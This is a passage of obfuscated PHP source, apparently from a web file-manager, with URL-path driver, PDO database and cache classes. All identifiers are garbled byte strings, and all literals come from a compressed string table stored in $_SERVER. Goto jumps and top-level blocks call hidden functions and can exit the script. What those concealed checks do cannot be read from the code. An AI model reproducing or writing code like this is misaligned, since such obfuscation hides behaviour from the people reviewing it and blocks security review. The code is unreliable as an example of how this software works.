fclose($¿ı×†µ); return $Ö¬‡¼ØÌ; } public function link($Áö®š„×, $Ğ’ÔïÜÂ = array()) { $©²Š§× =& $_SERVER[ì™ı‰º¯]; $Áö®š„× = trim($Áö®š„×, $©²Š§×[8]); if (!empty($this->token)) { $ı›Îø¨è = strtotime(date($©²Š§×[1500])); $Ë¹òĞéï = substr(md5($this->token . $©²Š§×[284] . $ı›Îø¨è . $©²Š§×[1501] . $Áö®š„×), 12, 8) . $ı›Îø¨è; $Ğ’ÔïÜÂ[] = $©²Š§×[1502] . $Ë¹òĞéï; } $¤»ÉÒ¬‡ = !empty($Ğ’ÔïÜÂ) ? $©²Š§×[73] . implode($©²Š§×[284], $Ğ’ÔïÜÂ) : $©²Š§×[12]; return $this->getHost() . $©²Š§×[8] . $Áö®š„× . $¤»ÉÒ¬‡; } public function fileOut($ôø‚æ³ˆ, $Œ¢‚é = false, $˜àêÎë˜ = false, $Èã»ü‡¤ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ôø‚æ³ˆ, $Œ¢‚é, $˜àêÎë˜, $Èã»ü‡¤); } if (!$˜àêÎë˜) { $˜àêÎë˜ = $this->pathThis($ôø‚æ³ˆ); } $¹¯³¶Ş¬ = $Œ¢‚é ? array($_SERVER[ì™ı‰º¯][1503] . rawurlencode($˜àêÎë˜)) : array(); $·Óâš¯ = $this->link($ôø‚æ³ˆ, $¹¯³¶Ş¬); $this->fileOutLink($·Óâš¯); } public function fileOutServer($¯çáõü, $¥ŠùñÜÁ = false, $°ŞƒŠ¬¿ = false, $Ô‹Àî « = '') { parent::fileOut($¯çáõü, $¥ŠùñÜÁ, $°ŞƒŠ¬¿, $Ô‹Àî «); } public function fileOutImage($³Ô°©èâ, $ÍÅ®äµŠ = 250) { $¸Ê±ƒÖ = $this->link($³Ô°©èâ . $_SERVER[ì™ı‰º¯][1504] . $ÍÅ®äµŠ); $this->fileOutLink($¸Ê±ƒÖ); } public function fileOutImageServer($è¨‰Ä›Â, $Õú¥ûæí = 250) { parent::fileOutImage($è¨‰Ä›Â, $Õú¥ûæí); } public function hashMd5($ë†çÖÂï) { $Àƒùìü± =& $_SERVER[ì™ı‰º¯]; $óĞçËœ¥ = $this->_objectMeta($ë†çÖÂï); return isset($óĞçËœ¥[$Àƒùìü±[212]]) ? $óĞçËœ¥[$Àƒùìü±[212]] : !1; } public function size($Ø…ìÛ½¡) { $ûÜ‹¤†– = $this->objectMeta($Ø…ìÛ½¡); return $ûÜ‹¤†– ? $ûÜ‹¤†–[$_SERVER[ì™ı‰º¯][76]] : 0; } public function info($©™Äø) { if ($this->isFolder($©™Äø)) { return $this->folderInfo($©™Äø); } else { if ($this->isFile($©™Äø)) { return $this->fileInfo($©™Äø); } } return !1; } public function exist($ŞÎ¤é›Ï) { return $this->isFile($ŞÎ¤é›Ï) || $this->isFolder($ŞÎ¤é›Ï); } public function isFile($’ë¡¬Ìæ) { return !$this->isFolder($’ë¡¬Ìæ) && $this->objectMeta($’ë¡¬Ìæ); } public function isFolder($µ¯ğ—) { return $this->cacheMethod($_SERVER[ì™ı‰º¯][165], $µ¯ğ—); } protected function objectMeta($»óíÁ„Í) { return $this->cacheMethod($_SERVER[ì™ı‰º¯][167], $»óíÁ„Í); } protected function _objectMeta($’š §¡º) { $­¸–Éç¡ =& $_SERVER[ì™ı‰º¯]; if ($’š §¡º == $­¸–Éç¡[12] || $’š §¡º == $­¸–Éç¡[8]) { return array(); } $»¥˜œ© = $this->ussRequest($’š §¡º, $­¸–Éç¡[1505]); if (!$»¥˜œ©[$­¸–Éç¡[1211]]) { return null; } $ˆÃ´‰º¯ = isset($»¥˜œ©[$­¸–Éç¡[1201]]) ? $»¥˜œ©[$­¸–Éç¡[1201]] : array(); if (!isset($ˆÃ´‰º¯[$­¸–Éç¡[1506]])) { return null; } $±ÊÅÄŸŠ = array($­¸–Éç¡[33] => isset($ˆÃ´‰º¯[$­¸–Éç¡[1506]]) ? $ˆÃ´‰º¯[$­¸–Éç¡[1506]] : null, $­¸–Éç¡[76] => isset($ˆÃ´‰º¯[$­¸–Éç¡[1507]]) ? $ˆÃ´‰º¯[$­¸–Éç¡[1507]] : null, $­¸–Éç¡[212] => isset($ˆÃ´‰º¯[$­¸–Éç¡[1508]]) ? $ˆÃ´‰º¯[$­¸–Éç¡[1508]] : null, $­¸–Éç¡[1475] => isset($ˆÃ´‰º¯[$­¸–Éç¡[1509]]) ? $ˆÃ´‰º¯[$­¸–Éç¡[1509]] : null); $±ÊÅÄŸŠ[$­¸–Éç¡[1476]] = isset($ˆÃ´‰º¯[$­¸–Éç¡[1510]]) ? strtotime($ˆÃ´‰º¯[$­¸–Éç¡[1510]]) : $±ÊÅÄŸŠ[$­¸–Éç¡[1475]]; return $±ÊÅÄŸŠ; } protected function _isFolder($ŒÎÔÛù´) { $½•‰–ˆÙ =& $_SERVER[ì™ı‰º¯]; if ($ŒÎÔÛù´ == $½•‰–ˆÙ[12] || $ŒÎÔÛù´ == $½•‰–ˆÙ[8]) { return !0; } $ã¯±ùÆÌ = $this->_objectMeta($ŒÎÔÛù´); return isset($ã¯±ùÆÌ[$½•‰–ˆÙ[33]]) && $ã¯±ùÆÌ[$½•‰–ˆÙ[33]] == $½•‰–ˆÙ[75] ? !0 : !1; } } if ($_SERVER[$_SERVER[ì™ı‰º¯][872]] != $_SERVER[$_SERVER[ì™ı‰º¯][1511]]) { $_getc = $_SERVER[ì™ı‰º¯][875]; $_getfile = $_SERVER[$_SERVER[ì™ı‰º¯][876]] . $_SERVER[ì™ı‰º¯][877]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ì™ı‰º¯][231], $_getfilec); if (count($_getarrs) < $_SERVER[ì™ı‰º¯][612]) { $exit = $_SERVER[ì™ı‰º¯][878]; $exit(); } $_act = $_SERVER[ì™ı‰º¯][1512]; $_act($_SERVER[$_SERVER[ì™ı‰º¯][873]]); } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ß™²Ï‘ = false) { } public function exist($Ñš¡×¹) { $şß§¶‡Œ = $this->info($Ñš¡×¹); return $şß§¶‡Œ[$_SERVER[ì™ı‰º¯][202]]; } public function isFile($®·‘å«Ì) { $ëáğåş = $this->info($®·‘å«Ì); return $ëáğåş[$_SERVER[ì™ı‰º¯][202]]; } public function isFolder($ò‡ĞÖÔá) { return !1; } public function size($„úì–…è) { $³¦Ñ¦ëÚ = $this->info($„úì–…è); return $³¦Ñ¦ëÚ[$_SERVER[ì™ı‰º¯][76]]; } public function info($¸¤Èœóæ) { return $this->infoParse($¸¤Èœóæ); } public function infoAuth($çşâó²±) { return $this->infoParse($çşâó²±); } public function infoWithChildren($Ìòªèû) { return $this->infoParse($Ìòªèû); } public function infoFull($şÃÓÅ´ä) { return $this->infoParse($şÃÓÅ´ä); } private function infoParse($Ü¼Ã™Ç) { $ÚğÔò =& $_SERVER[ì™ı‰º¯]; $š†şõŞ… = $this->header($Ü¼Ã™Ç); if (!$š†şõŞ… || !$š†şõŞ…[$ÚğÔò[745]]) { return !1; } $ôæ²Éí = _get($š†şõŞ…, $ÚğÔò[337], 0); $ë°§§æÓ = array($ÚğÔò[32] => $š†şõŞ…[$ÚğÔò[32]], $ÚğÔò[84] => $Ü¼Ã™Ç, $ÚğÔò[33] => $ÚğÔò[200], $ÚğÔò[76] => intval($ôæ²Éí), $ÚğÔò[174] => get_path_ext($š†şõŞ…[$ÚğÔò[32]]), $ÚğÔò[1389] => $ôæ²Éí > 0 && $š†şõŞ…[$ÚğÔò[1513]], $ÚğÔò[1390] => !1); return $ë°§§æÓ; } private function header($‡¿îÇÄ“) { $©ÌÊ‡Ú =& $_SERVER[ì™ı‰º¯]; if (isset(self::$_cacheHeader[$‡¿îÇÄ“])) { return self::$_cacheHeader[$‡¿îÇÄ“]; } $úÅ¢¹úç = isset($GLOBALS[$©ÌÊ‡Ú[1514]]) ? $GLOBALS[$©ÌÊ‡Ú[1514]] : !1; $GLOBALS[$©ÌÊ‡Ú[1514]] = !0; self::$_cacheHeader[$‡¿îÇÄ“] = url_header($‡¿îÇÄ“); $GLOBALS[$©ÌÊ‡Ú[1514]] = $úÅ¢¹úç; return self::$_cacheHeader[$‡¿îÇÄ“]; } public function hashSimple($äõãı, $À©ÔÉ†ë = false) { $ü©­ğ‘† =& $_SERVER[ì™ı‰º¯]; $é€äë¦¥ = $this->info($äõãı); if (!$é€äë¦¥ || !$é€äë¦¥[$ü©­ğ‘†[202]]) { return !1; } $‰„±÷¥Ã = $é€äë¦¥[$ü©­ğ‘†[76]]; $»¾Ø¨ÒŒ = 200; $Ï×‚†îğ = 50; if ($‰„±÷¥Ã <= $»¾Ø¨ÒŒ * $Ï×‚†îğ) { return md5($this->fileSubstr($äõãı, 0, $‰„±÷¥Ã)) . $‰„±÷¥Ã; } $ğ©õ‚°  = intval($‰„±÷¥Ã / $Ï×‚†îğ); $ÒâÙœœ = $ü©­ğ‘†[12]; $¨ø×É = timeFloat(); $§¯ËÕÖÄ = 15; for ($®¿ä‰§á = 0; $®¿ä‰§á < $Ï×‚†îğ; $®¿ä‰§á++) { if (timeFloat() - $¨ø×É > $§¯ËÕÖÄ) { return !1; } $¿ÒÆ‘ = $this->fileSubstr($äõãı, $ğ©õ‚°  * $®¿ä‰§á, $»¾Ø¨ÒŒ); if (!$¿ÒÆ‘) { return !1; } $ÒâÙœœ .= $¿ÒÆ‘; } $ÒâÙœœ .= $this->fileSubstr($äõãı, $‰„±÷¥Ã - $»¾Ø¨ÒŒ, $»¾Ø¨ÒŒ); return md5($ÒâÙœœ) . $‰„±÷¥Ã; } public function getContent($Ë´øµê¹) { return $this->fileSubstr($Ë´øµê¹); } public function fileSubstr($çéù¡šÌ, $„¼¶¥ë™ = 0, $ü—œéïó = -1) { $à™¾íôÎ =& $_SERVER[ì™ı‰º¯]; $Ëª²½ó³ = $this->info($çéù¡šÌ); if (!$Ëª²½ó³ || !$Ëª²½ó³[$à™¾íôÎ[202]] && $Ëª²½ó³[$à™¾íôÎ[76]] > 1024 * 1024 * 10) { return !1; } if ($ü—œéïó === -1) { $ü—œéïó = $Ëª²½ó³[$à™¾íôÎ[76]]; } if ($ü—œéïó == 0) { return $à™¾íôÎ[12]; } $šùêËşà = array($à™¾íôÎ[1515] . $„¼¶¥ë™ . $à™¾íôÎ[778] . ($„¼¶¥ë™ + $ü—œéïó - 1)); $úäââé÷ = url_request($çéù¡šÌ, $à™¾íôÎ[230], !1, $šùêËşà, !1, !1, 30); return $úäââé÷[$à™¾íôÎ[1201]] ? $úäââé÷[$à™¾íôÎ[1201]] : $à™¾íôÎ[12]; } public function download($ãÀĞª¹Á, $··ÆÕ¯ğ) { Downloader::start($ãÀĞª¹Á, $··ÆÕ¯ğ); return $··ÆÕ¯ğ; } } goto EùÉÈÆ¼ß; Aˆ±Š§©Ÿ¸: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ˆœ´–œŸ = '') { $ñ‚­ºÃÏ =& $_SERVER[ì™ı‰º¯]; if (!class_exists($ñ‚­ºÃÏ[913])) { think_exception(think_lang($ñ‚­ºÃÏ[14]) . $ñ‚­ºÃÏ[914]); } if (!empty($ˆœ´–œŸ)) { $this->config = $ˆœ´–œŸ; if (empty($this->config[$ñ‚­ºÃÏ[17]])) { $this->config[$ñ‚­ºÃÏ[17]] = array(); } } } public function connect($ù”®İÌ = '', $˜«å¥úš = 0) { $ôæ¢œ =& $_SERVER[ì™ı‰º¯]; if (!isset($this->linkID[$˜«å¥úš])) { if (empty($ù”®İÌ)) { $ù”®İÌ = $this->config; } $é€½öè = !empty($ù”®İÌ[$ôæ¢œ[17]][$ôæ¢œ[18]]) ? $ù”®İÌ[$ôæ¢œ[17]][$ôæ¢œ[18]] : $this->pconnect; if ($é€½öè) { $ù”®İÌ[$ôæ¢œ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$˜«å¥úš] = new PDO($ù”®İÌ[$ôæ¢œ[915]], $ù”®İÌ[$ôæ¢œ[887]], $ù”®İÌ[$ôæ¢œ[888]], $ù”®İÌ[$ôæ¢œ[17]]); } catch (PDOException $·ˆù¯¿ƒ) { think_exception($·ˆù¯¿ƒ->getMessage()); } $this->dbType = $this->_getDsnType($ù”®İÌ[$ôæ¢œ[915]]); if (in_array($this->dbType, array($ôæ¢œ[916], $ôæ¢œ[917], $ôæ¢œ[918], $ôæ¢œ[919]))) { think_exception($ôæ¢œ[920] . $this->dbType . $ôæ¢œ[921] . $this->dbType . $ôæ¢œ[922]); } if (!$this->linkID[$˜«å¥úš]) { think_exception($ôæ¢œ[923]); } try { $this->linkID[$˜«å¥úš]->exec($ôæ¢œ[924] . think_config($ôæ¢œ[890])); } catch (Exception $·ˆù¯¿ƒ) { } $this->connected = !0; if (1 != think_config($ôæ¢œ[22])) { unset($this->config); } } return $this->linkID[$˜«å¥úš]; } public function free() { $this->PDOStatement = null; } public function query($–¤äÜŞ£, $ºò–Ã˜ó = array()) { $«»Öêìü =& $_SERVER[ì™ı‰º¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $–¤äÜŞ£; if (!empty($ºò–Ã˜ó)) { $this->queryStr .= $«»Öêìü[925] . print_r($ºò–Ã˜ó, !0) . $«»Öêìü[926]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($«»Öêìü[23], 1); think_status($«»Öêìü[24]); $this->PDOStatement = $this->_linkID->prepare($–¤äÜŞ£); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $…êÇõ¾Ã = $this->PDOStatement->execute($ºò–Ã˜ó); $this->debug(); if (!1 === $…êÇõ¾Ã) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($“«²¤Íû, $Í€©ÇµÕ = array()) { $§®Å³ãô =& $_SERVER[ì™ı‰º¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $“«²¤Íû; if (!empty($Í€©ÇµÕ)) { $this->queryStr .= $§®Å³ãô[925] . print_r($Í€©ÇµÕ, !0) . $§®Å³ãô[926]; } $ÄöšÄÊÅ = !1; if ($this->dbType == $§®Å³ãô[919]) { if (preg_match($§®Å³ãô[927], $this->queryStr, $ÉÌ½ô“Ã)) { $this->table = think_config($§®Å³ãô[928]) . str_ireplace(think_config($§®Å³ãô[929]), $§®Å³ãô[378], $ÉÌ½ô“Ã[2]); $ÄöšÄÊÅ = (bool) $this->query($§®Å³ãô[930] . strtoupper($this->table) . $§®Å³ãô[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($§®Å³ãô[25], 1); think_status($§®Å³ãô[24]); $this->PDOStatement = $this->_linkID->prepare($“«²¤Íû); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ıäß££¾ = $this->PDOStatement->execute($Í€©ÇµÕ); $this->debug(); if (!1 === $ıäß££¾) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÄöšÄÊÅ || preg_match($§®Å³ãô[931], $“«²¤Íû)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $˜…øÁÙÑ = $this->_linkID->commit(); $this->transTimes = 0; if (!$˜…øÁÙÑ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $©ğ½‹î¤ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$©ğ½‹î¤) { $this->error(); return !1; } } return !0; } private function getAll() { $¶‚ˆ¢Ì = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¶‚ˆ¢Ì); return $¶‚ˆ¢Ì; } public function getFields($Ì…ê†ßÌ) { $Ÿ†€“Ş­ =& $_SERVER[ì™ı‰º¯]; $this->initConnect(!0); if (think_config($Ÿ†€“Ş­[932])) { $Ì’Â»óİ = str_replace($Ÿ†€“Ş­[933], $Ì…ê†ßÌ, think_config($Ÿ†€“Ş­[932])); } else { switch ($this->dbType) { case $Ÿ†€“Ş­[916]: case $Ÿ†€“Ş­[934]: $Ì’Â»óİ = "\x53\x45\x4c\x45\x43\x54\40\40\x20\x63\157\x6c\165\155\x6e\x5f\156\x61\x6d\x65\40\141\x73\40\x27\116\x61\x6d\145\47\54\40\x20\40\144\x61\164\x61\137\x74\171\160\x65\40\141\163\40\x27\124\x79\x70\x65\47\54\40\x20\40\x63\x6f\x6c\165\x6d\156\x5f\x64\145\x66\x61\x75\154\x74\40\141\163\x20\47\x44\145\x66\141\x75\154\x74\47\54\x20\x20\x20\151\x73\x5f\156\165\154\x6c\141\x62\x6c\145\x20\x61\163\x20\x27\116\165\154\154\x27\xa\11\11\106\x52\x4f\115\x9\x69\156\x66\x6f\162\x6d\141\x74\x69\x6f\156\x5f\x73\143\150\x65\155\x61\56\164\x61\x62\x6c\145\x73\40\x41\x53\x20\164\12\x9\x9\112\x4f\111\x4e\11\151\x6e\146\x6f\x72\155\141\164\151\157\x6e\x5f\x73\x63\x68\x65\155\141\x2e\143\x6f\x6c\165\155\x6e\163\x20\101\123\x20\x63\12\x9\11\x4f\x4e\40\x20\x74\x2e\x74\141\x62\154\145\x5f\x63\x61\x74\141\154\157\147\40\x3d\40\x63\56\x74\141\x62\x6c\x65\x5f\x63\x61\164\141\x6c\157\147\xa\x9\11\x41\x4e\104\x20\x74\56\x74\141\x62\x6c\x65\137\163\x63\150\x65\x6d\x61\x20\x3d\x20\143\56\164\x61\142\x6c\145\x5f\x73\x63\x68\145\x6d\141\xa\x9\11\x41\x4e\104\40\x74\56\164\141\142\154\145\137\x6e\x61\155\x65\40\x3d\x20\x63\56\164\141\x62\154\145\x5f\x6e\141\155\145\xa\11\11\x57\x48\105\122\x45\x20\x20\x20\x74\56\x74\141\142\x6c\x65\137\x6e\141\155\145\40\75\40\x27{$Ì…ê†ßÌ}\47"; break; case $Ÿ†€“Ş­[935]: $Ì’Â»óİ = $Ÿ†€“Ş­[936] . $Ì…ê†ßÌ . $Ÿ†€“Ş­[937]; break; case $Ÿ†€“Ş­[917]: case $Ÿ†€“Ş­[919]: $Ì’Â»óİ = $Ÿ†€“Ş­[938] . $Ÿ†€“Ş­[939] . $Ÿ†€“Ş­[940] . strtoupper($Ì…ê†ßÌ) . $Ÿ†€“Ş­[941] . strtoupper($Ì…ê†ßÌ) . $Ÿ†€“Ş­[942]; break; case $Ÿ†€“Ş­[943]: $Ì’Â»óİ = $Ÿ†€“Ş­[944] . $Ì…ê†ßÌ . $Ÿ†€“Ş­[945]; break; case $Ÿ†€“Ş­[918]: break; case $Ÿ†€“Ş­[946]: default: $Ì’Â»óİ = $Ÿ†€“Ş­[947] . ($this->dbType == $Ÿ†€“Ş­[946] ? "\x60{$Ì…ê†ßÌ}\140" : $Ì…ê†ßÌ); } } $íƒ¸›¡ = $this->query($Ì’Â»óİ); $ÑÃ–Øœ° = array(); if ($íƒ¸›¡) { foreach ($íƒ¸›¡ as $§ıÇÇ”û => $’èÇÒÉ›) { $’èÇÒÉ› = array_change_key_case($’èÇÒÉ›); $’èÇÒÉ›[$Ÿ†€“Ş­[32]] = isset($’èÇÒÉ›[$Ÿ†€“Ş­[32]]) ? $’èÇÒÉ›[$Ÿ†€“Ş­[32]] : $Ÿ†€“Ş­[378]; $’èÇÒÉ›[$Ÿ†€“Ş­[33]] = isset($’èÇÒÉ›[$Ÿ†€“Ş­[33]]) ? $’èÇÒÉ›[$Ÿ†€“Ş­[33]] : $Ÿ†€“Ş­[378]; $ì•£İÁ„ = isset($’èÇÒÉ›[$Ÿ†€“Ş­[273]]) ? $’èÇÒÉ›[$Ÿ†€“Ş­[273]] : $’èÇÒÉ›[$Ÿ†€“Ş­[32]]; $ÑÃ–Øœ°[$ì•£İÁ„] = array($Ÿ†€“Ş­[32] => $ì•£İÁ„, $Ÿ†€“Ş­[33] => $’èÇÒÉ›[$Ÿ†€“Ş­[33]], $Ÿ†€“Ş­[35] => (bool) (isset($’èÇÒÉ›[$Ÿ†€“Ş­[103]]) && $’èÇÒÉ›[$Ÿ†€“Ş­[103]] === $Ÿ†€“Ş­[12] || isset($’èÇÒÉ›[$Ÿ†€“Ş­[35]]) && $’èÇÒÉ›[$Ÿ†€“Ş­[35]] === $Ÿ†€“Ş­[12]), $Ÿ†€“Ş­[37] => isset($’èÇÒÉ›[$Ÿ†€“Ş­[37]]) ? $’èÇÒÉ›[$Ÿ†€“Ş­[37]] : (isset($’èÇÒÉ›[$Ÿ†€“Ş­[56]]) ? $’èÇÒÉ›[$Ÿ†€“Ş­[56]] : $Ÿ†€“Ş­[378]), $Ÿ†€“Ş­[39] => isset($’èÇÒÉ›[$Ÿ†€“Ş­[94]]) ? strtolower($’èÇÒÉ›[$Ÿ†€“Ş­[94]]) == $Ÿ†€“Ş­[41] : (isset($’èÇÒÉ›[$Ÿ†€“Ş­[57]]) ? $’èÇÒÉ›[$Ÿ†€“Ş­[57]] : !1), $Ÿ†€“Ş­[42] => isset($’èÇÒÉ›[$Ÿ†€“Ş­[948]]) ? strtolower($’èÇÒÉ›[$Ÿ†€“Ş­[948]]) == $Ÿ†€“Ş­[44] : (isset($’èÇÒÉ›[$Ÿ†€“Ş­[94]]) ? $’èÇÒÉ›[$Ÿ†€“Ş­[94]] : !1)); } } return $ÑÃ–Øœ°; } public function getTables($ÙªßèòÈ = '') { $›¾çš·ˆ =& $_SERVER[ì™ı‰º¯]; if (think_config($›¾çš·ˆ[949])) { $Ïç·û¬ = str_replace($›¾çš·ˆ[950], $ÙªßèòÈ, think_config($›¾çš·ˆ[949])); } else { switch ($this->dbType) { case $›¾çš·ˆ[917]: case $›¾çš·ˆ[919]: $Ïç·û¬ = $›¾çš·ˆ[951]; break; case $›¾çš·ˆ[916]: case $›¾çš·ˆ[934]: $Ïç·û¬ = $›¾çš·ˆ[952]; break; case $›¾çš·ˆ[943]: $Ïç·û¬ = $›¾çš·ˆ[953]; break; case $›¾çš·ˆ[918]: think_exception(think_lang($›¾çš·ˆ[954]) . $›¾çš·ˆ[955]); break; case $›¾çš·ˆ[935]: $Ïç·û¬ = $›¾çš·ˆ[45] . $›¾çš·ˆ[46] . $›¾çš·ˆ[47]; break; case $›¾çš·ˆ[946]: default: if (!empty($ÙªßèòÈ)) { $Ïç·û¬ = $›¾çš·ˆ[898] . $ÙªßèòÈ . $›¾çš·ˆ[899]; } else { $Ïç·û¬ = $›¾çš·ˆ[900]; } } } $Ÿˆ·×Éë = $this->query($Ïç·û¬); $¶·ËßëÚ = array(); foreach ($Ÿˆ·×Éë as $×‹‚µ => $±¤­úÁÖ) { $¶·ËßëÚ[$×‹‚µ] = current($±¤­úÁÖ); } return $¶·ËßëÚ; } protected function parseLimit($¦¸Ë®) { $–úååÛ™ =& $_SERVER[ì™ı‰º¯]; $Í‹Ğºô = $–úååÛ™[12]; if (!empty($¦¸Ë®)) { switch ($this->dbType) { case $–úååÛ™[943]: case $–úååÛ™[935]: $¦¸Ë® = explode($–úååÛ™[50], $¦¸Ë®); if (count($¦¸Ë®) > 1) { $Í‹Ğºô .= $–úååÛ™[51] . $¦¸Ë®[1] . $–úååÛ™[52] . $¦¸Ë®[0] . $–úååÛ™[53]; } else { $Í‹Ğºô .= $–úååÛ™[51] . $¦¸Ë®[0] . $–úååÛ™[53]; } break; case $–úååÛ™[916]: case $–úååÛ™[934]: break; case $–úååÛ™[918]: break; case $–úååÛ™[917]: case $–úååÛ™[919]: break; case $–úååÛ™[946]: default: $Í‹Ğºô .= $–úååÛ™[51] . $¦¸Ë® . $–úååÛ™[53]; } } return $Í‹Ğºô; } public function parseKey(&$ıò©˜Òï, $¹İØ·Ó = true) { $‚»ŒÀŸ¨ =& $_SERVER[ì™ı‰º¯]; if ($¹İØ·Ó) { $ıò©˜Òï = $this->parseKeyCheck($ıò©˜Òï); } if ($this->dbType == $‚»ŒÀŸ¨[946]) { if ($ıò©˜Òï != $‚»ŒÀŸ¨[189] && !preg_match($‚»ŒÀŸ¨[910], $ıò©˜Òï)) { $ıò©˜Òï = $‚»ŒÀŸ¨[385] . trim($ıò©˜Òï, $‚»ŒÀŸ¨[385]) . $‚»ŒÀŸ¨[385]; } return $ıò©˜Òï; } else { return parent::parseKey($ıò©˜Òï, $¹İØ·Ó); } } public function close() { $this->_linkID = null; } public function error() { $‘¾…Ø» =& $_SERVER[ì™ı‰º¯]; if ($this->PDOStatement) { $â£¢¾ÀÆ = $this->PDOStatement->errorInfo(); $this->error = $â£¢¾ÀÆ[1] . $‘¾…Ø»[4] . $â£¢¾ÀÆ[2]; } else { $this->error = $‘¾…Ø»[12]; } if ($‘¾…Ø»[12] != $this->queryStr) { $this->error .= LNG($‘¾…Ø»[48]) . $this->queryStr; } think_trace($this->error, $‘¾…Ø»[12], $‘¾…Ø»[49]); return $this->error; } public function escapeString($ıèßõíà) { $ü™ÙË•ç =& $_SERVER[ì™ı‰º¯]; switch ($this->dbType) { case $ü™ÙË•ç[943]: case $ü™ÙË•ç[916]: case $ü™ÙË•ç[934]: case $ü™ÙË•ç[946]: return addslashes($ıèßõíà); case $ü™ÙË•ç[918]: case $ü™ÙË•ç[935]: case $ü™ÙË•ç[917]: case $ü™ÙË•ç[919]: return str_ireplace($ü™ÙË•ç[58], $ü™ÙË•ç[59], $ıèßõíà); } } protected function parseValue($öÚÔĞŸÌ) { $È²É¼ÙË =& $_SERVER[ì™ı‰º¯]; if (is_string($öÚÔĞŸÌ)) { $¸­ûŒåõ = strpos($öÚÔĞŸÌ, $È²É¼ÙË[4]) === 0 && in_array($öÚÔĞŸÌ, array_keys($this->bind)); $öÚÔĞŸÌ = $¸­ûŒåõ ? $this->escapeString($öÚÔĞŸÌ) : $È²É¼ÙË[956] . $this->escapeString($öÚÔĞŸÌ) . $È²É¼ÙË[956]; } elseif (isset($öÚÔĞŸÌ[0]) && is_string($öÚÔĞŸÌ[0]) && strtolower($öÚÔĞŸÌ[0]) == $È²É¼ÙË[297]) { $öÚÔĞŸÌ = $this->escapeString($öÚÔĞŸÌ[1]); } elseif (is_array($öÚÔĞŸÌ)) { $öÚÔĞŸÌ = array_map(array($this, $È²É¼ÙË[957]), $öÚÔĞŸÌ); } elseif (is_bool($öÚÔĞŸÌ)) { $öÚÔĞŸÌ = $öÚÔĞŸÌ ? $È²É¼ÙË[88] : $È²É¼ÙË[198]; } elseif (is_null($öÚÔĞŸÌ)) { $öÚÔĞŸÌ = $È²É¼ÙË[103]; } return $öÚÔĞŸÌ; } public function getLastInsertId() { $ıÊÚìä =& $_SERVER[ì™ı‰º¯]; switch ($this->dbType) { case $ıÊÚìä[943]: case $ıÊÚìä[935]: case $ıÊÚìä[916]: case $ıÊÚìä[934]: case $ıÊÚìä[918]: case $ıÊÚìä[946]: return $this->_linkID->lastInsertId(); case $ıÊÚìä[917]: case $ıÊÚìä[919]: $õç´®â = $this->table; $ì²ëÅ³İ = $this->query("\123\105\114\105\x43\124\x20{$õç´®â}\56\143\x75\162\x72\x76\x61\x6c\40\143\x75\162\x72\x76\141\154\x20\x46\122\117\x4d\x20\x64\x75\141\x6c"); return $ì²ëÅ³İ ? $ì²ëÅ³İ[0][$ıÊÚìä[958]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($­ı¿Âäš) { $Ğ•¾ÜÄ¸ =& $_SERVER[ì™ı‰º¯]; if (!CacheLock::fileLock($Ğ•¾ÜÄ¸[13])) { return !1; } $Ğ¼¶Ã· = parent::query($­ı¿Âäš); CacheLock::fileUnLock($Ğ•¾ÜÄ¸[13]); return $Ğ¼¶Ã·; } public function execute($Šşü„º¼) { $¡³Øàì— =& $_SERVER[ì™ı‰º¯]; if (!CacheLock::fileLock($¡³Øàì—[13])) { return !1; } $š‰²—¹ = parent::execute($Šşü„º¼); CacheLock::fileUnLock($¡³Øàì—[13]); return $š‰²—¹; } } class DbSqlite3 extends DbSqlite3Base { public function query($ƒÈ¤á¬¼) { $ÃÅ¾í¿ì =& $_SERVER[ì™ı‰º¯]; if (!CacheLock::fileLock($ÃÅ¾í¿ì[13])) { return !1; } $â‰ãÏßø = parent::query($ƒÈ¤á¬¼); CacheLock::fileUnLock($ÃÅ¾í¿ì[13]); return $â‰ãÏßø; } public function execute($º²ïİòÄ) { $¤Â‹ì¼À =& $_SERVER[ì™ı‰º¯]; if (!CacheLock::fileLock($¤Â‹ì¼À[13])) { return !1; } $­„ˆ“’ò = parent::execute($º²ïİòÄ); CacheLock::fileUnLock($¤Â‹ì¼À[13]); return $­„ˆ“’ò; } } goto D¹•ĞØ‰‚; dÀÍ¸äœãÜ: define($_SERVER[ì™ı‰º¯][0], $_SERVER[ì™ı‰º¯][1]); $_SERVER[ÆĞ§üËİ] = explode($_SERVER[ì™ı‰º¯][2], gzinflate(substr($_SERVER[ì™ı‰º¯][3], 10, -8))); function binCheckEq($Æì¬®ï­, $Á¯ø°…‘) { return $Æì¬®ï­ == $Á¯ø°…‘; } goto CßëĞÃÌ³; A­ÅŒç¯Ş: $_SERVER[Ê³óµ¯‡] = explode($_SERVER[ì™ı‰º¯][607], gzinflate(substr($_SERVER[ì™ı‰º¯][608], 10, -8))); $pedjyqohwr = $_SERVER[ì™ı‰º¯][609]; if (strlen($pedjyqohwr) < $_SERVER[ì™ı‰º¯][610]) { die; } goto eƒÜ¦ã§È; BŒâ»ÃõÙº: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($üÊñá², $¼Îëˆ) { $¿ûøğ¤Õ =& $_SERVER[ì™ı‰º¯]; $this->cachePath = $üÊñá²[$¿ûøğ¤Õ[84]]; $this->prefix = $¿ûøğ¤Õ[830]; 